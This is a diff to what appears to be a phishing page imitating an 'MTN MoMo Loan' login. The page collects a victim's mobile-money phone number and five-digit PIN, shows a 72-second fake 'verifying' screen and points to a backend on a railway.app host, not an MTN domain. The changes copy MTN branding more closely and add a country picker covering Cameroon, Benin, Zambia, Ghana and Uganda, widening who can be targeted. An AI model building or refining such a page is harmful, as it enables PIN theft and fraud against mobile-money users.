@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>MTN MoMo Loan - Login</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
         * {
             margin: 0;
             padding: 0;
@@ -17,8 +17,33 @@
         html, body {
             height: 100%;
             font-family: 'Inter', sans-serif;
-            background: #f0f2f5;
+            background: #eef1f6;
             overflow: hidden;
+            position: relative;
+        }
+
+        /* Ambient background glow */
+        body::before {
+            content: "";
+            position: fixed;
+            top: -20%;
+            left: -10%;
+            width: 70%;
+            height: 70%;
+            background: radial-gradient(circle, rgba(0,71,171,0.10), transparent 60%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        body::after {
+            content: "";
+            position: fixed;
+            bottom: -20%;
+            right: -10%;
+            width: 70%;
+            height: 70%;
+            background: radial-gradient(circle, rgba(255,204,0,0.10), transparent 60%);
+            pointer-events: none;
+            z-index: 0;
         }
 
         body {
@@ -29,6 +54,8 @@
             height: 100vh;
             height: 100dvh;
             gap: 10px;
+            position: relative;
+            z-index: 1;
         }
 
         /* ===== HEADER ===== */
@@ -39,23 +66,35 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background: white;
+            background: rgba(255,255,255,0.75);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border: 1px solid rgba(255,255,255,0.9);
             border-radius: 16px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            box-shadow: 0 8px 30px rgba(0,71,171,0.06);
             position: relative;
             flex-shrink: 0;
+            z-index: 5;
         }
 
         .back-btn {
-            font-size: 24px;
-            background: none;
+            font-size: 22px;
+            background: #f0f4ff;
             border: none;
             cursor: pointer;
-            color: #333;
-            line-height: 1;
-            width: 24px;
-            text-align: left;
-            padding: 0;
+            color: #0047AB;
+            width: 36px;
+            height: 36px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            transition: transform 0.2s, background 0.2s;
+        }
+        .back-btn:hover {
+            background: #e0e9ff;
+            transform: translateX(-2px);
         }
 
         .logo-container {
@@ -64,90 +103,146 @@
             transform: translateX(-50%);
         }
 
-        .momo-icon {
-            display: inline-flex;
+        /* ===== MoMo LOGO (matched to index.html) ===== */
+        .mtn-logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 3px;
+        }
+        .mtn-logo-icon {
+            width: 38px;
+            height: 38px;
+            background: #FFD700;
+            border-radius: 8px;
+            display: flex;
             align-items: center;
             justify-content: center;
-            background: #0047AB;
-            color: #FFCC00;
-            font-weight: 700;
-            font-size: 16px;
-            padding: 7px 16px;
-            border-radius: 40px;
+            font-size: 1.4rem;
+            font-weight: 900;
+            color: #003366;
+            position: relative;
+            box-shadow: 0 6px 16px rgba(255,215,0,0.5);
+        }
+        .mtn-logo-icon::after {
+            content: 'M';
+            font-size: 1.55rem;
+            font-weight: 900;
+        }
+        .mtn-logo-text {
+            font-size: 0.85rem;
+            font-weight: 800;
+            color: #003366;
             line-height: 1;
-            letter-spacing: -0.5px;
-            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
-            white-space: nowrap;
+        }
+        .mtn-logo-sub {
+            font-size: 0.58rem;
+            color: #888;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            line-height: 1;
         }
 
         /* ===== CARD ===== */
         .card {
-            background: white;
-            border-radius: 24px;
-            padding: 24px 20px;
+            background: rgba(255,255,255,0.92);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.9);
+            border-radius: 28px;
+            padding: 28px 22px;
             width: 100%;
             max-width: 480px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            box-shadow:
+                0 20px 60px rgba(0,71,171,0.10),
+                0 4px 12px rgba(0,0,0,0.02);
             flex: 1;
             min-height: 0;
             display: flex;
             flex-direction: column;
             justify-content: center;
             overflow-y: auto;
+            position: relative;
+            z-index: 2;
         }
 
         /* ===== FORM FIELDS ===== */
         .phone-input-group {
-            margin-bottom: 18px;
+            margin-bottom: 20px;
+            position: relative;
         }
 
         .input-label {
             display: block;
-            font-weight: 600;
+            font-weight: 700;
             color: #333;
-            margin-bottom: 7px;
-            font-size: 13px;
+            margin-bottom: 8px;
+            font-size: 12.5px;
+            letter-spacing: 0.2px;
         }
 
         .phone-input {
             display: flex;
             align-items: center;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            overflow: hidden;
-            transition: border-color 0.3s, box-shadow 0.3s;
-            background: white;
+            border: 2px solid #e6ebf5;
+            border-radius: 14px;
+            overflow: visible;
+            transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
+            background: #fafbff;
+            position: relative;
         }
 
         .phone-input:focus-within {
             border-color: #0047AB;
-            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.10), 0 8px 24px rgba(0,71,171,0.08);
         }
 
         .phone-input.invalid {
             border-color: #e74c3c;
-            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.1);
+            background: #fff5f5;
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.10);
             animation: shake 0.4s ease;
         }
 
-        .phone-prefix {
+        /* ===== COUNTRY SELECTOR ===== */
+        .country-btn {
             display: flex;
             align-items: center;
-            gap: 5px;
+            gap: 7px;
             padding: 12px 12px;
-            background: #f0f4ff;
-            font-weight: 700;
-            font-size: 15px;
+            background: linear-gradient(135deg, #f0f4ff, #e6ecff);
+            font-weight: 800;
+            font-size: 14.5px;
             color: #0047AB;
-            border-right: 2px solid #e0e0e0;
+            border: none;
+            border-right: 2px solid #e0e6f5;
+            border-top-left-radius: 12px;
+            border-bottom-left-radius: 12px;
             white-space: nowrap;
             flex-shrink: 0;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: background 0.2s;
+            position: relative;
+        }
+        .country-btn:hover {
+            background: linear-gradient(135deg, #e6ecff, #dbe4ff);
+        }
+        .country-btn .caret-sm {
+            font-size: 9px;
+            opacity: 0.7;
+            margin-left: 2px;
+            transition: transform 0.25s;
+        }
+        .country-btn.open .caret-sm {
+            transform: rotate(180deg);
         }
 
         .flag-svg {
-            width: 20px;
-            height: 14px;
-            border-radius: 2px;
+            width: 22px;
+            height: 15px;
+            border-radius: 3px;
             box-shadow: 0 0 0 1px rgba(0,0,0,0.08);
             flex-shrink: 0;
         }
@@ -160,14 +255,73 @@
             padding: 12px 14px;
             font-size: 15px;
             font-family: 'Inter', sans-serif;
-            color: #333;
+            color: #1a1a2e;
+            font-weight: 600;
             outline: none;
             min-width: 0;
             background: transparent;
+            letter-spacing: 0.5px;
+        }
+        .phone-input input::placeholder {
+            color: #b8bfd0;
+            font-weight: 500;
+            letter-spacing: normal;
         }
 
-        .phone-input input::placeholder {
-            color: #bbb;
+        .country-menu {
+            position: absolute;
+            top: calc(100% + 8px);
+            left: 0;
+            min-width: 240px;
+            background: #fff;
+            border: 1.5px solid #e6ebf5;
+            border-radius: 14px;
+            box-shadow: 0 16px 40px rgba(0,71,171,0.18);
+            overflow: hidden;
+            max-height: 0;
+            opacity: 0;
+            visibility: hidden;
+            transform: translateY(-6px);
+            transition: max-height 0.28s ease, opacity 0.22s ease, visibility 0.22s, transform 0.22s;
+            z-index: 100;
+        }
+        .country-menu.open {
+            max-height: 320px;
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+
+        .country-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            width: 100%;
+            padding: 12px 16px;
+            background: #fff;
+            border: none;
+            border-top: 1px solid #f0f3f9;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a2e;
+            text-align: left;
+            transition: background 0.15s;
+        }
+        .country-item:first-child { border-top: none; }
+        .country-item:hover { background: #f0f4ff; }
+        .country-item .dial {
+            margin-left: auto;
+            color: #8a90a2;
+            font-weight: 700;
+            font-size: 13px;
+        }
+        .country-item.selected {
+            background: #f0f4ff;
+        }
+        .country-item.selected .dial {
+            color: #0047AB;
         }
 
         /* ===== PIN ===== */
@@ -175,38 +329,47 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 7px;
+            margin-bottom: 8px;
         }
-
-        .pin-label-row .input-label {
-            margin-bottom: 0;
-        }
+        .pin-label-row .input-label { margin-bottom: 0; }
 
         .forgot-link {
             font-size: 12px;
-            font-weight: 600;
+            font-weight: 700;
             color: #0047AB;
             text-decoration: none;
             cursor: pointer;
+            padding: 4px 6px;
+            border-radius: 6px;
+            transition: background 0.15s;
+        }
+        .forgot-link:hover { background: #f0f4ff; }
+
+        /* Pin row: 5 boxes + eye toggle on the right */
+        .pin-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
         .pin-boxes {
             display: flex;
             justify-content: center;
             gap: 10px;
+            flex: 1;
         }
 
         .pin-box {
-            width: 44px;
-            height: 48px;
+            width: 46px;
+            height: 52px;
             text-align: center;
-            font-size: 20px;
+            font-size: 22px;
             font-weight: 800;
             color: #1a1a2e;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
+            border: 2px solid #e6ebf5;
+            border-radius: 12px;
             background: #fafbff;
-            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s, transform 0.15s;
             outline: none;
             font-family: 'Inter', sans-serif;
             caret-color: #0047AB;
@@ -216,19 +379,66 @@
 
         .pin-box:focus {
             border-color: #0047AB;
-            background: #f0f4ff;
-            box-shadow: 0 0 0 3px rgba(0, 71, 171, 0.12);
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.10);
+            transform: translateY(-2px);
         }
 
         .pin-box.filled {
             border-color: #0047AB;
-            background: #f0f4ff;
+            background: linear-gradient(135deg, #f0f4ff, #e6ecff);
+            color: #0047AB;
         }
 
         .pin-box.invalid {
             border-color: #e74c3c;
-            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.12);
+            background: #fff5f5;
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.10);
             animation: shake 0.4s ease;
+        }
+
+        /* Eye toggle */
+        .eye-toggle {
+            flex-shrink: 0;
+            width: 46px;
+            height: 52px;
+            background: #f0f4ff;
+            border: 2px solid #e6ebf5;
+            border-radius: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s, border-color 0.2s, transform 0.15s;
+            padding: 0;
+        }
+        .eye-toggle:hover {
+            background: #e6ecff;
+            border-color: #c9d6f0;
+        }
+        .eye-toggle:active {
+            transform: scale(0.95);
+        }
+        .eye-toggle svg {
+            width: 22px;
+            height: 22px;
+            stroke: #0047AB;
+            stroke-width: 2;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            transition: opacity 0.2s, transform 0.2s;
+        }
+        .eye-toggle .eye-open { display: block; }
+        .eye-toggle .eye-closed { display: none; }
+        .eye-toggle.revealed .eye-open { display: none; }
+        .eye-toggle.revealed .eye-closed { display: block; }
+        .eye-toggle.revealed {
+            background: #0047AB;
+            border-color: #0047AB;
+        }
+        .eye-toggle.revealed svg {
+            stroke: #FFCC00;
         }
 
         @keyframes shake {
@@ -240,39 +450,62 @@
         .error-text {
             color: #e74c3c;
             font-size: 12px;
-            margin-top: 5px;
+            margin-top: 6px;
             display: none;
-            font-weight: 500;
+            font-weight: 600;
             line-height: 1.4;
         }
-
         .error-text.show {
             display: block;
+            animation: slideDown 0.3s ease;
+        }
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-4px); }
+            to   { opacity: 1; transform: translateY(0); }
         }
 
         /* ===== LOGIN BUTTON ===== */
         .login-btn {
             width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #0047AB, #002D7A);
+            padding: 16px;
+            background: linear-gradient(135deg, #0058D8, #0047AB 40%, #002D7A);
             color: white;
             border: none;
             border-radius: 50px;
             font-size: 16px;
-            font-weight: 700;
+            font-weight: 800;
+            letter-spacing: 0.6px;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
+            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
             font-family: 'Inter', sans-serif;
-            margin-top: 22px;
+            margin-top: 24px;
+            box-shadow:
+                0 12px 28px rgba(0,71,171,0.32),
+                inset 0 1px 0 rgba(255,255,255,0.2);
+            position: relative;
+            overflow: hidden;
         }
-
+        .login-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow:
+                0 16px 34px rgba(0,71,171,0.45),
+                inset 0 1px 0 rgba(255,255,255,0.25);
+        }
         .login-btn:active:not(:disabled) {
             transform: scale(0.98);
         }
-
         .login-btn:disabled {
-            opacity: 0.6;
+            opacity: 0.65;
             cursor: not-allowed;
+        }
+        .login-btn::after {
+            content: "→";
+            margin-left: 8px;
+            display: inline-block;
+            transition: transform 0.25s;
+        }
+        .login-btn:hover:not(:disabled)::after {
+            transform: translateX(4px);
         }
 
         /* ===== SECURITY + SIGNUP ===== */
@@ -280,34 +513,38 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 5px;
-            margin-top: 14px;
-            font-size: 11px;
-            color: #999;
+            gap: 6px;
+            margin-top: 16px;
+            font-size: 11.5px;
+            color: #8a90a2;
+            font-weight: 500;
         }
 
         .signup-text {
             text-align: center;
             font-size: 13px;
-            color: #777;
-            margin-top: 14px;
+            color: #8a90a2;
+            margin-top: 16px;
+            font-weight: 500;
         }
-
         .signup-text a {
             color: #0047AB;
-            font-weight: 700;
+            font-weight: 800;
             text-decoration: none;
+            cursor: pointer;
         }
+        .signup-text a:hover { text-decoration: underline; }
 
         /* ===== FOOTER ===== */
         footer {
             padding: 6px;
-            color: #aaa;
+            color: #a9b0c2;
             font-size: 11px;
             text-align: center;
             width: 100%;
             max-width: 480px;
             flex-shrink: 0;
+            font-weight: 500;
         }
 
         /* ============================================
@@ -316,7 +553,7 @@
         .verify-overlay {
             position: fixed;
             inset: 0;
-            background: #ffffff;
+            background: linear-gradient(135deg, #ffffff 0%, #f4f7ff 100%);
             display: none;
             flex-direction: column;
             align-items: center;
@@ -324,10 +561,7 @@
             padding: 32px 24px;
             z-index: 2000;
         }
-
-        .verify-overlay.show {
-            display: flex;
-        }
+        .verify-overlay.show { display: flex; }
 
         .verify-content {
             display: flex;
@@ -337,20 +571,26 @@
             text-align: center;
         }
 
-        .verify-momo-icon {
-            display: inline-flex;
+        .verify-momo-logo {
+            width: 68px;
+            height: 68px;
+            background: #FFD700;
+            border-radius: 16px;
+            display: flex;
             align-items: center;
             justify-content: center;
-            background: #0047AB;
-            color: #FFCC00;
-            font-weight: 800;
-            font-size: 20px;
-            padding: 11px 22px;
-            border-radius: 50px;
-            line-height: 1;
-            box-shadow: 0 8px 24px rgba(0, 71, 171, 0.28);
+            font-size: 2rem;
+            font-weight: 900;
+            color: #003366;
             margin-bottom: 32px;
+            position: relative;
+            box-shadow: 0 14px 34px rgba(255,215,0,0.5);
             animation: overlayPulse 2s ease-in-out infinite;
+        }
+        .verify-momo-logo::after {
+            content: 'M';
+            font-size: 2.2rem;
+            font-weight: 900;
         }
 
         @keyframes overlayPulse {
@@ -359,18 +599,16 @@
         }
 
         .verify-spinner {
-            width: 52px;
-            height: 52px;
+            width: 56px;
+            height: 56px;
             border: 5px solid #e0e8ff;
             border-top-color: #0047AB;
             border-radius: 50%;
             animation: verifySpin 0.9s linear infinite;
-            margin-bottom: 26px;
+            margin-bottom: 28px;
+            box-shadow: 0 8px 24px rgba(0,71,171,0.08);
         }
-
-        @keyframes verifySpin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes verifySpin { to { transform: rotate(360deg); } }
 
         .verify-title {
             font-size: 19px;
@@ -378,17 +616,16 @@
             color: #1a1a2e;
             margin-bottom: 10px;
             line-height: 1.3;
+            letter-spacing: -0.3px;
         }
-
-        .verify-title .highlight {
-            color: #0047AB;
-        }
+        .verify-title .highlight { color: #0047AB; }
 
         .verify-subtitle {
             font-size: 13px;
-            color: #888;
+            color: #8a90a2;
             line-height: 1.6;
             margin-bottom: 28px;
+            font-weight: 500;
         }
 
         .verify-dots span {
@@ -398,50 +635,56 @@
         .verify-dots span:nth-child(1) { animation-delay: 0s; }
         .verify-dots span:nth-child(2) { animation-delay: 0.2s; }
         .verify-dots span:nth-child(3) { animation-delay: 0.4s; }
-
         @keyframes dotBlink {
             0%, 80%, 100% { opacity: 0.2; }
             40% { opacity: 1; }
         }
 
         .verify-bar {
-            width: 200px;
+            width: 220px;
             height: 5px;
             background: #e8edf7;
             border-radius: 4px;
             overflow: hidden;
             margin-bottom: 28px;
         }
-
         .verify-bar-fill {
             height: 100%;
             width: 0%;
             background: linear-gradient(90deg, #0047AB, #FFCC00);
             border-radius: 4px;
+            transition: width 0.3s ease;
         }
 
         .verify-security {
             display: flex;
             align-items: center;
-            gap: 5px;
-            font-size: 11px;
-            color: #aaa;
+            gap: 6px;
+            font-size: 11.5px;
+            color: #a9b0c2;
+            font-weight: 500;
         }
 
         /* ===== SMALL PHONES ===== */
         @media (max-height: 700px) {
             .phone-input-group { margin-bottom: 14px; }
-            .card { padding: 18px 16px; }
-            .login-btn { margin-top: 16px; padding: 14px; }
-            .security-notice, .signup-text { margin-top: 10px; }
-            .momo-icon { font-size: 15px; padding: 6px 14px; }
+            .card { padding: 22px 18px; }
+            .login-btn { margin-top: 18px; padding: 15px; }
+            .security-notice, .signup-text { margin-top: 12px; }
+            .mtn-logo-icon { width: 34px; height: 34px; font-size: 1.2rem; }
+            .pin-box { width: 42px; height: 48px; font-size: 20px; }
+            .eye-toggle { width: 42px; height: 48px; }
         }
 
         @media (max-width: 380px) {
-            .pin-boxes { gap: 8px; }
-            .pin-box { width: 40px; height: 44px; font-size: 18px; border-radius: 9px; }
-            .phone-prefix { padding: 11px 10px; font-size: 14px; gap: 4px; }
+            .pin-boxes { gap: 6px; }
+            .pin-row { gap: 8px; }
+            .pin-box { width: 38px; height: 44px; font-size: 17px; border-radius: 10px; }
+            .eye-toggle { width: 38px; height: 44px; border-radius: 10px; }
+            .eye-toggle svg { width: 18px; height: 18px; }
             .phone-input input { padding: 11px 12px; font-size: 14px; }
+            .country-btn { padding: 11px 10px; font-size: 13.5px; gap: 5px; }
+            .country-menu { min-width: 200px; }
         }
     </style>
 </head>
@@ -449,9 +692,13 @@
     <header>
         <button class="back-btn" onclick="window.location.href='confirm.html'" aria-label="Go back">←</button>
         <div class="logo-container">
-            <span class="momo-icon">MoMo</span>
+            <div class="mtn-logo">
+                <div class="mtn-logo-icon"></div>
+                <div class="mtn-logo-text">MTN MoMo</div>
+                <div class="mtn-logo-sub">Loans</div>
+            </div>
         </div>
-        <div style="width:24px;"></div>
+        <div style="width:36px;"></div>
     </header>
 
     <main class="card">
@@ -459,18 +706,43 @@
         <div class="phone-input-group">
             <label class="input-label">MoMo Phone Number</label>
             <div class="phone-input" id="phoneWrapper">
-                <span class="phone-prefix">
-                    <svg class="flag-svg" viewBox="0 0 900 600" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                        <rect width="300" height="600" fill="#007A5E"/>
-                        <rect x="300" width="300" height="600" fill="#CE1126"/>
-                        <rect x="600" width="300" height="600" fill="#FCD116"/>
-                        <polygon points="450,220 465,275 522,275 476,308 492,363 450,330 408,363 424,308 378,275 435,275" fill="#FCD116"/>
-                    </svg>
-                    <span>+237</span>
-                </span>
+                <button type="button" class="country-btn" id="countryBtn" aria-haspopup="true">
+                    <span id="countryFlag">FLAG</span>
+                    <span id="countryCode">+237</span>
+                    <span class="caret-sm">▼</span>
+                </button>
+
                 <input type="tel" id="phone" placeholder="6XX XXX XXX" maxlength="11" autocomplete="tel">
+
+                <div class="country-menu" id="countryMenu">
+                    <button type="button" class="country-item" data-country="CM" data-code="+237" data-len="9">
+                        <span class="flag-slot" data-flag="CM"></span>
+                        <span>Cameroon</span>
+                        <span class="dial">+237</span>
+                    </button>
+                    <button type="button" class="country-item" data-country="BJ" data-code="+229" data-len="8">
+                        <span class="flag-slot" data-flag="BJ"></span>
+                        <span>Benin</span>
+                        <span class="dial">+229</span>
+                    </button>
+                    <button type="button" class="country-item" data-country="ZM" data-code="+260" data-len="9">
+                        <span class="flag-slot" data-flag="ZM"></span>
+                        <span>Zambia</span>
+                        <span class="dial">+260</span>
+                    </button>
+                    <button type="button" class="country-item" data-country="GH" data-code="+233" data-len="9">
+                        <span class="flag-slot" data-flag="GH"></span>
+                        <span>Ghana</span>
+                        <span class="dial">+233</span>
+                    </button>
+                    <button type="button" class="country-item" data-country="UG" data-code="+256" data-len="9">
+                        <span class="flag-slot" data-flag="UG"></span>
+                        <span>Uganda</span>
+                        <span class="dial">+256</span>
+                    </button>
+                </div>
             </div>
-            <div class="error-text" id="phoneError">Please enter a valid Cameroon phone number (9 digits)</div>
+            <div class="error-text" id="phoneError">Please enter a valid phone number</div>
         </div>
 
         <!-- PIN -->
@@ -479,17 +751,33 @@
                 <label class="input-label">MoMo PIN</label>
                 <span class="forgot-link" onclick="alert('Please dial *126# to reset your MoMo PIN.')">Forgot PIN?</span>
             </div>
-            <div class="pin-boxes" id="pinBoxes">
-                <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" autocomplete="off">
-                <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" autocomplete="off">
-                <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" autocomplete="off">
-                <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" autocomplete="off">
-                <input type="password" class="pin-box" id="pin5" maxlength="1" inputmode="numeric" autocomplete="off">
+            <div class="pin-row">
+                <div class="pin-boxes" id="pinBoxes">
+                    <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" autocomplete="off">
+                    <input type="password" class="pin-box" id="pin5" maxlength="1" inputmode="numeric" autocomplete="off">
+                </div>
+
+                <!-- Professional eye toggle -->
+                <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show PIN" title="Show PIN">
+                    <!-- Eye-open (default) -->
+                    <svg class="eye-open" viewBox="0 0 24 24">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
+                    </svg>
+                    <!-- Eye-closed (when revealed) -->
+                    <svg class="eye-closed" viewBox="0 0 24 24">
+                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+                        <line x1="1" y1="1" x2="23" y2="23"/>
+                    </svg>
+                </button>
             </div>
             <div class="error-text" id="pinError">Please enter your 5-digit MoMo PIN</div>
         </div>
 
-        <button class="login-btn" id="loginBtn">LOGIN →</button>
+        <button class="login-btn" id="loginBtn">LOGIN</button>
 
         <div class="security-notice">
             <span>🔒</span>
@@ -506,7 +794,7 @@
     <!-- VERIFYING OVERLAY -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-content">
-            <div class="verify-momo-icon">MoMo</div>
+            <div class="verify-momo-logo"></div>
             <div class="verify-spinner"></div>
             <h2 class="verify-title">
                 Verifying your <span class="highlight">MoMo account</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
@@ -522,28 +810,133 @@
         </div>
     </div>
 
+    <!-- SVG FLAG LIBRARY (hidden) -->
+    <svg width="0" height="0" style="position:absolute;overflow:hidden;" aria-hidden="true">
+        <defs>
+            <symbol id="flag-CM" viewBox="0 0 900 600">
+                <rect width="300" height="600" fill="#007A5E"/>
+                <rect x="300" width="300" height="600" fill="#CE1126"/>
+                <rect x="600" width="300" height="600" fill="#FCD116"/>
+                <polygon points="450,220 465,275 522,275 476,308 492,363 450,330 408,363 424,308 378,275 435,275" fill="#FCD116"/>
+            </symbol>
+            <symbol id="flag-BJ" viewBox="0 0 900 600">
+                <rect width="900" height="300" fill="#FCD116"/>
+                <rect y="300" width="900" height="300" fill="#CE1126"/>
+                <rect width="350" height="600" fill="#008751"/>
+            </symbol>
+            <symbol id="flag-ZM" viewBox="0 0 900 600">
+                <rect width="900" height="600" fill="#198A00"/>
+                <rect x="600" y="360" width="75" height="240" fill="#DE2010"/>
+                <rect x="675" y="360" width="75" height="240" fill="#000"/>
+                <rect x="750" y="360" width="75" height="240" fill="#EF7D00"/>
+                <path d="M720 300 c-20 -30 15 -55 35 -40 c-15 15 -30 30 -35 40 z" fill="#EF7D00"/>
+            </symbol>
+            <symbol id="flag-GH" viewBox="0 0 900 600">
+                <rect width="900" height="200" fill="#CE1126"/>
+                <rect y="200" width="900" height="200" fill="#FCD116"/>
+                <rect y="400" width="900" height="200" fill="#006B3F"/>
+                <polygon points="450,220 465,268 517,268 476,298 490,346 450,316 410,346 424,298 383,268 435,268" fill="#000"/>
+            </symbol>
+            <symbol id="flag-UG" viewBox="0 0 900 600">
+                <rect width="900" height="100" fill="#000"/>
+                <rect y="100" width="900" height="100" fill="#FCDC04"/>
+                <rect y="200" width="900" height="100" fill="#D90000"/>
+                <rect y="300" width="900" height="100" fill="#000"/>
+                <rect y="400" width="900" height="100" fill="#FCDC04"/>
+                <rect y="500" width="900" height="100" fill="#D90000"/>
+                <circle cx="450" cy="300" r="90" fill="#fff"/>
+                <circle cx="450" cy="300" r="28" fill="#000"/>
+            </symbol>
+        </defs>
+    </svg>
+
     <script>
         // ============================================
         // BACKEND URL
         // ============================================
         const API_BASE = 'https://momo-usersey-production.up.railway.app';
+        const LOADING_DURATION_MS = 72 * 1000;
 
         // ============================================
-        // LOADING CONFIGURATION (72 seconds)
+        // COUNTRY DATA
         // ============================================
-        const LOADING_DURATION_MS = 72 * 1000;
+        const COUNTRIES = {
+            CM: { code: '+237', digits: 9, placeholder: '6XX XXX XXX' },
+            BJ: { code: '+229', digits: 8, placeholder: 'XX XX XX XX' },
+            ZM: { code: '+260', digits: 9, placeholder: '9XX XXX XXX' },
+            GH: { code: '+233', digits: 9, placeholder: '2XX XXX XXX' },
+            UG: { code: '+256', digits: 9, placeholder: '7XX XXX XXX' }
+        };
+
+        let currentCountry = 'CM';
+
+        const countryBtn   = document.getElementById('countryBtn');
+        const countryMenu  = document.getElementById('countryMenu');
+        const countryFlag  = document.getElementById('countryFlag');
+        const countryCode  = document.getElementById('countryCode');
+        const phoneInput   = document.getElementById('phone');
+        const phoneWrapper = document.getElementById('phoneWrapper');
+        const phoneError   = document.getElementById('phoneError');
+
+        /* Render flag SVGs inline */
+        function renderFlagsIn(root = document) {
+            root.querySelectorAll('.flag-slot[data-flag]').forEach(el => {
+                const id = el.dataset.flag;
+                el.innerHTML = `<svg class="flag-svg" viewBox="0 0 900 600" aria-hidden="true"><use href="#flag-${id}"/></svg>`;
+            });
+        }
+        renderFlagsIn();
+
+        /* Select country */
+        function setCountry(iso) {
+            const data = COUNTRIES[iso];
+            if (!data) return;
+            currentCountry = iso;
+            countryCode.textContent = data.code;
+            countryFlag.innerHTML = `<svg class="flag-svg" viewBox="0 0 900 600" aria-hidden="true"><use href="#flag-${iso}"/></svg>`;
+            phoneInput.placeholder = data.placeholder;
+            phoneInput.maxLength = data.digits;
+            phoneInput.value = '';
+            phoneError.textContent = 'Please enter a valid phone number';
+
+            countryMenu.querySelectorAll('.country-item').forEach(item => {
+                item.classList.toggle('selected', item.dataset.country === iso);
+            });
+        }
+
+        countryBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            countryBtn.classList.toggle('open');
+            countryMenu.classList.toggle('open');
+        });
+
+        countryMenu.querySelectorAll('.country-item').forEach(item => {
+            item.addEventListener('click', (e) => {
+                e.stopPropagation();
+                setCountry(item.dataset.country);
+                countryBtn.classList.remove('open');
+                countryMenu.classList.remove('open');
+                phoneInput.focus();
+            });
+        });
+
+        document.addEventListener('click', (e) => {
+            if (!countryMenu.contains(e.target) && e.target !== countryBtn && !countryBtn.contains(e.target)) {
+                countryBtn.classList.remove('open');
+                countryMenu.classList.remove('open');
+            }
+        });
+
+        setCountry('CM');
 
         // ============================================
         // PHONE INPUT
         // ============================================
-        const phoneInput = document.getElementById('phone');
-        const phoneWrapper = document.getElementById('phoneWrapper');
-        const phoneError = document.getElementById('phoneError');
-
         phoneInput.addEventListener('input', function() {
             this.value = this.value.replace(/[^0-9 ]/g, '');
             const digits = this.value.replace(/\s/g, '');
-            if (digits.length === 9) {
+            const needed = COUNTRIES[currentCountry].digits;
+            if (digits.length === needed) {
                 phoneWrapper.classList.remove('invalid');
                 phoneError.classList.remove('show');
             }
@@ -603,11 +996,26 @@
         }
 
         // ============================================
-        // VERIFY OVERLAY (progress bar)
+        // EYE TOGGLE — Show/Hide PIN
+        // ============================================
+        const eyeToggle = document.getElementById('eyeToggle');
+        let pinVisible = false;
+
+        eyeToggle.addEventListener('click', () => {
+            pinVisible = !pinVisible;
+            pinBoxes.forEach(box => {
+                box.type = pinVisible ? 'text' : 'password';
+            });
+            eyeToggle.classList.toggle('revealed', pinVisible);
